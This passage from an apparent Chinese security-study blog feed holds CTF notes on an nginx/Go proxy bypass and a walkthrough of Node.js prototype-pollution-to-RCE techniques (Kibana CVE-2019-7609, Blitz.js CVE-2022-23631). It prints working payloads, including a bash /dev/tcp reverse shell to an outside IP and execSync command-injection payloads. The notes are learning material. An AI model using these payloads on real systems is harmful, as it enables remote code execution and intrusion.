        <content type="html"><![CDATA[<h2 id="分析和尝试-DONE"><a href="#分析和尝试-DONE" class="headerlink" title="分析和尝试(DONE)"></a>分析和尝试(DONE)</h2><ol><li><p>是一个go的http服务器，目标是&#x2F;v1&#x2F;readflag</p></li><li><p>发现proxy.conf中&#x2F;v1是403，那就需要绕过了，重定向？</p></li><li><p>这里的nginx是反向代理，进行转发，除了403不用管</p></li><li><p>ai一下代码进行分析(go还没学)，思路</p><ol><li>要是abs并FollowRedirects，返回nil则可以重定向</li><li>这根本就没有限制啊，直接构造发送</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将下述这个包发送到/v2/路由即可</span></span><br><span class="line"> &#123;</span><br><span class="line">     <span class="string">&quot;url&quot;</span>: <span class="string">&quot;https://target/v1/api/flag&quot;</span>,</span><br><span class="line">     <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">     <span class="string">&quot;headers&quot;</span>: &#123;</span><br><span class="line">         <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">     &#125;,</span><br><span class="line">     <span class="string">&quot;follow_redirects&quot;</span>: <span class="literal">true</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 看来wp发现最简单的包是</span></span><br><span class="line"> &#123;<span class="string">&quot;URL&quot;</span>:<span class="string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span>,<span class="string">&quot;Method&quot;</span>:<span class="string">&quot;POST&quot;</span>,<span class="string">&quot;Body&quot;</span>:<span class="string">&quot;&quot;</span>&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="其他注意点"><a href="#其他注意点" class="headerlink" title="*其他注意点"></a>*其他注意点</h2><ol><li><code>.ShouldBindJSON(&amp;proxyRequest)</code>：将客户端发来的 JSON 请求体解析到 proxyRequest 结构体中。这里可以不用header这里，有点理解错了，但是问题不大</li><li><em><strong>nginx反向代理</strong></em>，见proxy.conf<ol><li>反向代理就是在服务端的代理，统一收包再分流，再nginx中配置如proxy.conf</li><li>配置保存到 Nginx 的配置文件中，通常是 &#x2F;etc&#x2F;nginx&#x2F;nginx.conf 或 &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;your_config_file.conf</li></ol></li></ol><h2 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h2><ol><li>main.go见src目录，感觉没什么好讲的，多chat就对了</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment"># proxy.conf</span></span><br><span class="line">server &#123;</span><br><span class="line">    listen 8000;</span><br><span class="line"></span><br><span class="line">    location ~ /v1 &#123;</span><br><span class="line">        <span class="built_in">return</span> 403; <span class="comment"># location ~ /v1：使用正则表达式匹配以 /v1 开头的请求</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    location ~ /v2 &#123;</span><br><span class="line">        proxy_pass http://localhost:8769;   <span class="comment"># 将匹配的请求代理到本地的 8769 端口，即你的后端服务</span></span><br><span class="line">        proxy_http_version 1.1;</span><br><span class="line">        proxy_set_header Host <span class="variable">$host</span>;    <span class="comment"># 设置 Host 头为原始请求的 Host，确保后端服务知道原始请求的主机名</span></span><br><span class="line">        proxy_set_header X-Real-IP <span class="variable">$remote_addr</span>;    <span class="comment"># 设置 X-Real-IP 头为客户端的真实 IP 地址，后端服务可以使用这个头来获取客户端的 IP</span></span><br><span class="line">        proxy_set_header Upgrade <span class="variable">$http_upgrade</span>;</span><br><span class="line">        proxy_set_header Connection <span class="variable">$connection_upgrade</span>;</span><br><span class="line">        proxy_set_header X-Forwarded-For <span class="variable">$proxy_add_x_forwarded_for</span>; <span class="comment"># 设置 X-Forwarded-For 头，包含客户端的真实 IP 地址，后端服务可以使用这个头来获取客户端的 IP</span></span><br><span class="line">        <span class="comment"># 因为经过了再一次转发，所以一般会传递一些请求头</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> recurrence </tag>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ENV hacking</title>
      <link href="/2024/11/03/ENV%20hacking/"/>
      <url>/2024/11/03/ENV%20hacking/</url>
      
        <content type="html"><![CDATA[<h2 id="ref"><a href="#ref" class="headerlink" title="ref"></a>ref</h2><ol><li><a href="https://www.elttam.com/blog/env/">解释性语言中的环境变量渗透</a></li><li><a href="https://po6ix.github.io/Abusing-Environment-Variables/">po6ix</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> env </tag>
            
            <tag> all in one </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pp2rce</title>
      <link href="/2024/11/02/pp2rce/"/>
      <url>/2024/11/02/pp2rce/</url>
      
        <content type="html"><![CDATA[<blockquote><p>感慨，ai现在真是强大，真的是概念解答神<br>这篇文章适用于参数固定不可控的pp2rce，这是一类源码上的漏洞</p></blockquote><h3 id="child-process-spawn-深入部分源码"><a href="#child-process-spawn-深入部分源码" class="headerlink" title="child_process.spawn()深入部分源码"></a>child_process.spawn()深入部分源码</h3><ol><li>REF<ol><li>说实话，这篇要先看RCE in Kibana才能懂一些(等涉及到了再来学)，我一开始是没有看懂<a href="https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/">很细但是太菜看不懂</a></li></ol></li><li>简单先说一下：child_process 内置的6个函数底层最终都会调用 spawn(<a href="https://c1oudfl0w0.github.io/blog/2023/06/29/Nodejs%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/#child-process">详见</a>)，调用spawn后会进入子函数normalizeSpawnArguments，在该子函数中会对env变量进行赋值并会将最终的envPairs作为新进程中的环境变量存储在该进程的文件&#x2F;proc&#x2F;self&#x2F;environ中 –&gt; normalizeSpawnArguments实现中存在原型链污染的注入点(let key in中的in)</li><li>截取一些敏感的部分<ol><li><p>最终会使用execvp来执行任务<code>execvp(options-&gt;file, options-&gt;args);</code>这里的 options-&gt;file 就是我们最初传给spawn的参数。 比如我们的例子是，那么此时的file就是，当然对于有参数的命令，则 options-&gt;args 与之对应。<code>spawn(&#39;whoami&#39;)</code></p><ol><li>这里经过处理后已经不是一开始参数中的options了，具体源码还看不懂sad</li><li><em><strong>对于fork()有些许不同</strong></em></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exports</span>.<span class="property">fork</span> = <span class="keyword">function</span>(<span class="params">modulePath <span class="comment">/*, args, options*/</span></span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">    options.<span class="property">execPath</span> = options.<span class="property">execPath</span> || process.<span class="property">execPath</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">spawn</span>(options.<span class="property">execPath</span>, args, options);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>以下是normalizeSpawnArguments</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// node早期版本</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">normalizeSpawnArguments</span>(<span class="params">file, args, options</span>) &#123;</span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">if</span> (options === <span class="literal">undefined</span>)</span><br><span class="line">    options = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    ...<span class="comment">//省略</span></span><br><span class="line">  <span class="keyword">var</span> env = options.<span class="property">env</span> || process.<span class="property">env</span>;</span><br><span class="line">  <span class="keyword">var</span> envPairs = [];</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> key <span class="keyword">in</span> env) &#123;</span><br><span class="line">    envPairs.<span class="title function_">push</span>(key + <span class="string">&#x27;=&#x27;</span> + env[key]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="title function_">_convertCustomFds</span>(options);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">    <span class="attr">file</span>: file,</span><br><span class="line">    <span class="attr">args</span>: args,</span><br><span class="line">    <span class="attr">options</span>: options,</span><br><span class="line">    <span class="attr">envPairs</span>: envPairs</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*node v18</span></span><br><span class="line"><span class="comment">  for (const key of envKeys) &#123;</span></span><br><span class="line"><span class="comment">    const value = env[key];</span></span><br><span class="line"><span class="comment">    if (value !== undefined) &#123;</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(key, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        validateArgumentNullCheck(value, `options.env[&#x27;$&#123;key&#125;&#x27;]`);</span></span><br><span class="line"><span class="comment">        ArrayPrototypePush(envPairs, `$&#123;key&#125;=$&#123;value&#125;`);</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-env"><a href="#RCE-via-env" class="headerlink" title="RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)"></a>RCE via env &lt;- *RCE in Kibana (CVE-2019-7609)</h3><h4 id="深入理解-proc-self-environ"><a href="#深入理解-proc-self-environ" class="headerlink" title="深入理解&#x2F;proc&#x2F;self&#x2F;environ"></a>深入理解&#x2F;proc&#x2F;self&#x2F;environ</h4><ol><li><p>类似的敏感文件</p> <figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">/proc/self/environ 当前进程的环境变量</span><br><span class="line">/proc/self/cwd 当前进程运行的目录环境</span><br><span class="line">/proc/self/cmdline 文件查看当前进行进程执行命令</span><br><span class="line">/proc/[pid]/fd 当程序打开一个文件, 会获得程序的文件描述符, 而此时如果文件被删除, 只会删除文件的目录项, 不会清空文件的内容, 原来的进程依然可以通过描述符对文件进行读取, 也就是说, 文件还存在内存里。</span><br><span class="line">/proc/net/fib_trie、/proc/net/arp、/proc/net/route 内网探测</span><br><span class="line">/sys/class/net/eth0/address mac地址</span><br></pre></td></tr></table></figure></li><li><p><em><strong>进程</strong></em>: 进程（Process）是计算机操作系统中一个重要的概念，它是程序的一次执行过程，是系统进行资源分配和调度的基本单位。每个进程都有一个唯一的标识符，称为进程ID（PID）。进程不仅包含程序的指令集，还包括程序执行时所需的资源</p><ol><li>每个进程都有自己独立的地址空间，一个进程的内存与其他进程的内存是隔离的 –&gt; 子进程是独立的，有自己的内存空间和资源。父进程的崩溃不会直接影响子进程，反之亦然</li></ol></li><li><p><em><strong>每个进程共享一个&#x2F;proc&#x2F;self&#x2F;environ?</strong></em></p><ol><li>不同进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件是不同的！但是每个独立的进程并不会拥有自己独立的文件系统。相反，所有进程共享同一个全局文件系统</li><li>这是通过 Linux 内核的命名空间（namespaces）和虚拟文件系统（VFS）机制实现的。尽管所有进程共享同一个全局文件系统，但每个进程的 &#x2F;proc&#x2F;self&#x2F;environ 文件实际上是一个<strong>虚拟文件</strong>(符号链接)，由内核动态生成，反映了该进程的环境变量</li></ol></li></ol><h4 id="payloads和核心思想"><a href="#payloads和核心思想" class="headerlink" title="payloads和核心思想"></a>payloads和核心思想</h4><blockquote><p>注意下最后payload两种形式都可以</p></blockquote><ol><li>REF<ol><li>写的很是清晰易懂<a href="https://research.securitum.com/prototype-pollution-rce-kibana-cve-2019-7609/">原文</a> –&gt; 部分内容写在上面了</li><li><a href="https://cloud.tencent.com/developer/article/1533939">这篇解析也挺好的，跟着思考</a></li></ol></li><li>要求<ol><li>需要有可以操控的文件如这里的&#x2F;proc&#x2F;self&#x2F;environ</li><li>&#x2F;proc&#x2F;self&#x2F;environ中注入的环境变量应该位于首行</li></ol></li><li>提炼一下并思考一下我的问题<ol><li><em><strong>这里的核心思想</strong></em>是通过env变量的原型链污染来实现控制新进程的环境变量，并通过特殊的参数NODE_OPTIONS“包含js文件”并执行代码</li><li><em><strong>Q DONE: NODE_OPTIONS是如何发挥作用的呢？</strong></em><ol><li>A: 这里也是通过环境变量进行设置的，其实可以从<a href="https://nodejs.org/api/cli.html#node_optionsoptions">官方文档</a>推断出来的，这里允许的<code>NODE_OPTIONS=&#39;--require &quot;./file.js&quot;&#39; node</code>实质上是添加了环境变量，分开来使用<code>export NODE_OPTIONS</code>也是可以的 –&gt; 也可以<strong>问gpt bro</strong></li></ol></li><li>这里通过在env中设置环境新的环境变量<code>AAA=console.log(123)//</code>来做poc，js文件时将后续进行注释</li><li>Q DONE: 如何使得&#x2F;proc&#x2F;self&#x2F;environ文件的开头是就是我们想要执行的语句？<ol><li>A: 通过字典排序？注意到&#x3D;表达式本身就是一个合法的js语言，这里其实不一定(因为一开始的for in读取的是键，在js对象中的键大部分按照插入顺序来的)</li></ol></li><li>Q DONE: 这里不是js文件也可以执行js代码吗？<ol><li>A: 难道和php一样？笑死，给忘记了，在node中require()本来就不用加上文件尾部，默认为js解析 –&gt; <strong>所以可能有和php一样的文件包含漏洞</strong></li></ol></li></ol></li><li>payload<ol><li><p>Notice</p><ol><li>由于js不是编译型语言(包括nodejs)，所以注释其实不是必须的，只要有执行到命令那一行就好</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// bash</span></span><br><span class="line"><span class="variable constant_">NODE_OPTIONS</span>=<span class="string">&#x27;--require file&#x27;</span> node</span><br><span class="line"></span><br><span class="line"><span class="comment">// file</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>).<span class="title function_">toString</span>());odivnafadnvoa</span><br><span class="line">  <span class="comment">// 会在运行同步命令后才报错</span></span><br></pre></td></tr></table></figure></li><li><p>final paylaod</p><ol><li><code>.es(*).props(label.__proto__.env.AAAA=&#39;require(&quot;child_process&quot;).exec(&quot;bash -i &gt;&amp; /dev/tcp/192.168.0.136/12345 0&gt;&amp;1&quot;);process.exit()//&#39;).props(label.__proto__.env.NODE_OPTIONS=&#39;--require /proc/self/environ&#39;)</code></li><li><strong>NODE_OPTIONS也可以不写在里面.env里面，可以确保要执行的命令在第一行，HackTricks中说的(其实也还好，可能是字典顺序&#x2F;插入顺序等，只有一个当然更好)</strong> –&gt; 这就是原型链污染的魅力</li></ol>  <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable constant_">USERINPUT</span> = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;__proto__&quot;: &#123;&quot;NODE_OPTIONS&quot;: &quot;--require /proc/self/environ&quot;, &quot;env&quot;: &#123; &quot;EVIL&quot;:&quot;console.log(require(\\\&quot;child_process\\\&quot;).execSync(\\\&quot;touch /tmp/pp2rce\\\&quot;).toString())//&quot;&#125;&#125;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如何理解</span></span><br><span class="line">a=&#123;&#125;  <span class="comment">// [[Pro..]]==Object</span></span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>=&#123;&#125;</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">AAA</span>=<span class="string">&quot;console.log(123)&quot;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">NODE_OPTIONS</span>=<span class="string">&#x27;--require hello&#x27;</span></span><br><span class="line">a</span><br><span class="line">a.<span class="property">__proto__</span>.<span class="property">env</span>.<span class="property">NODE_OPTIONS</span>  <span class="comment">// 输出--require hello</span></span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(a.<span class="property">__proto__</span>.<span class="property">env</span>)  <span class="comment">// 输出[&#x27;AAA&#x27;, &#x27;NODE_OPTIONS&#x27;]</span></span><br></pre></td></tr></table></figure></li></ol></li></ol><h3 id="RCE-via-cmdline"><a href="#RCE-via-cmdline" class="headerlink" title="RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough"></a>RCE via cmdline &lt;- *Blitz.js RPC suprjson(CVE-2022-23631) simple gothrough</h3><h4 id="分析一下源码"><a href="#分析一下源码" class="headerlink" title="分析一下源码"></a>分析一下源码</h4><ol><li><p>ref</p><ol><li><a href="https://www.sonarsource.com/blog/blitzjs-prototype-pollution/">cve-2022-23631</a>但是这篇也只是介绍</li></ol></li><li><p>相关信息：已在 superjson 1.8.1 和 Blitz.js 0.45.3 中修复</p></li><li><p><em><strong>从源码看漏洞原理</strong></em></p><ol><li><a href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">github argv0与shell源码</a>，这里适用原型污染会使得有shell(L456)<a href="https://po6ix.github.io/Abusing-Environment-Variables/">这篇里也有说明</a>和argv0(L477)并会被识别 -&gt; <strong>这里其实也不需要很了解，只要了解有传入和没有传入的差别就好，通过原型链勿扰构造有传入的情况</strong></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 最终执行belike???这里的在原文章 https://c1oudfl0w0.github.io/blog/2024/10/11/PP2RCE/#via-env-vars-cmdline 中实验也可以不改shell，我感觉的具体原因应该看看 深入理解shell这里</span></span><br><span class="line"><span class="title function_">execve</span>(<span class="string">&quot;/proc/self/exe&quot;</span>, [<span class="string">&quot;console.log(&#x27;pwned!&#x27;);//&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;node …&quot;</span>], &#123; <span class="attr">NODE_OPTIONS</span>: <span class="string">&quot;--require /proc/self/cmdline&quot;</span> &#125;)</span><br></pre></td></tr></table></figure></li></ol><h4 id="深入理解argv0"><a href="#深入理解argv0" class="headerlink" title="深入理解argv0"></a>深入理解argv0</h4><blockquote><p>怎么感觉node的官方文档写得很简略呢，还是要实验和ai一下</p></blockquote><ol><li>解析一下argv数组<ol><li>argv数组是在可执行文件命令已经解析并确定要执行的可执行文件之后传递给该可执行文件的，<strong>修改其中的argv[0]并不会影响到确定要执行的可执行文件</strong>，但是但是<strong>修改argv[1]等元素可以显著影响程序的行为，因为在具体实现中会作为配置项</strong></li><li>但argv[0]还是会有影响：某些程序的具体实现会根据 argv[0] 的值来决定执行不同的功能</li></ol></li><li>Q: child_process spawn下argv0的作用？<ol><li>注意到官方文档中的一句话: Node.js 在启动时会用 process.execPath 覆盖 argv[0]，因此 Node.js 子进程中的 process.argv[0] 不会匹配从父进程传给 spawn 的 argv0 参数。改为使用 process.argv0 属性检索它 –&gt; <strong>argv[0]和argv是不同的</strong><ol><li><a href="https://www.geeksforgeeks.org/node-js-process-execpath-property/">node process.execPath 官方文档</a>，说明该属性返回当前 Node.js 可执行文件的绝对路径 –&gt; <strong>by the way在fork中可以调整(可以获取看看上面的源码)</strong></li></ol></li><li>在nodejs中<ol><li><p>process.argv[0]：指向 Node.js 可执行文件的路径。这个值会被 process.execPath 覆盖，因此总是显示 Node.js 可执行文件的路径。</p></li><li><p>process.argv0：保留了从父进程传递给子进程的 argv[0] 值。这个值不会被覆盖，因此可以用来获取原始的 argv[0] 值 –&gt; <strong>spawn方法下会被传入到&#x2F;proc&#x2F;self&#x2F;cmdline中</strong>，测试脚本如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// parent.js</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> scriptPath = <span class="string">&#x27;./child.js&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 以 &quot;customNode&quot; 的名义调用</span></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;node&#x27;</span>, [scriptPath], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;customNode&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// child.js</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv:&#x27;</span>, process.<span class="property">argv</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;process.argv0:&#x27;</span>, process.<span class="property">argv0</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 读取 /proc/self/cmdline</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> cmdline = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;/proc/self/cmdline&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>).<span class="title function_">split</span>(<span class="string">&#x27;\0&#x27;</span>).<span class="title function_">filter</span>(<span class="title class_">Boolean</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;cmdline:&#x27;</span>, cmdline);</span><br><span class="line"></span><br><span class="line"><span class="comment">// bash and res</span></span><br><span class="line">node parent.<span class="property">js</span></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv</span>: [</span><br><span class="line">  <span class="string">&#x27;/usr/bin/node&#x27;</span>,</span><br><span class="line">  <span class="string">&#x27;/home/kc1zs4/Code/CodeVscode/Notes/WLabs/1/child.js&#x27;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: process.<span class="property">argv0</span>: customNode</span><br><span class="line"></span><br><span class="line"><span class="attr">stdout</span>: <span class="attr">cmdline</span>: [ <span class="string">&#x27;customNode&#x27;</span>, <span class="string">&#x27;./child.js&#x27;</span> ]</span><br></pre></td></tr></table></figure></li></ol></li></ol></li></ol><h4 id="深入理解shell"><a href="#深入理解shell" class="headerlink" title="深入理解shell"></a>深入理解shell</h4><ol><li><p>Q: shell属性如何和argv0属性进行协作？</p><ol><li>A: <a href="https://github.com/nodejs/node/blob/v8.x/lib/child_process.js#L429">源码部分</a>见下，可知argv0并不会影响传入shell的命令，只是会影响传入子进程的argv0，同时进行测试可以知道分析是正确的，<em><strong>同时在此处shell对我们想要的命令的执行几乎是没有影响的</strong></em></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test</span></span><br><span class="line"><span class="keyword">const</span> &#123; spawn &#125; = <span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> child = <span class="title function_">spawn</span>(<span class="string">&#x27;ls&#x27;</span>, [], &#123; <span class="attr">argv0</span>: <span class="string">&#x27;pwd&#x27;</span>, <span class="attr">shell</span>: <span class="string">&#x27;/bin/sh&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">child.<span class="property">stdout</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`stdout: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line">child.<span class="property">stderr</span>.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>, <span class="function">(<span class="params">data</span>) =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`stderr: <span class="subst">$&#123;data&#125;</span>`</span>));</span><br><span class="line"></span><br><span class="line">child.<span class="title function_">on</span>(<span class="string">&#x27;close&#x27;</span>, <span class="function">(<span class="params">code</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`子进程退出，退出码 <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// src</span></span><br><span class="line"><span class="keyword">if</span> (options.<span class="property">shell</span>) &#123;</span><br><span class="line">   <span class="keyword">const</span> command = [file].<span class="title function_">concat</span>(args).<span class="title function_">join</span>(<span class="string">&#x27; &#x27;</span>);</span><br><span class="line"></span><br><span class="line">   <span class="keyword">if</span> (process.<span class="property">platform</span> === <span class="string">&#x27;win32&#x27;</span>) &#123;</span><br><span class="line">     <span class="keyword">if</span> (<span class="keyword">typeof</span> options.<span class="property">shell</span> === <span class="string">&#x27;string&#x27;</span>)</span><br><span class="line">       file = options.<span class="property">shell</span>;</span><br><span class="line">     <span class="keyword">else</span></span><br><span class="line">       file = process.<span class="property">env</span>.<span class="property">comspec</span> || <span 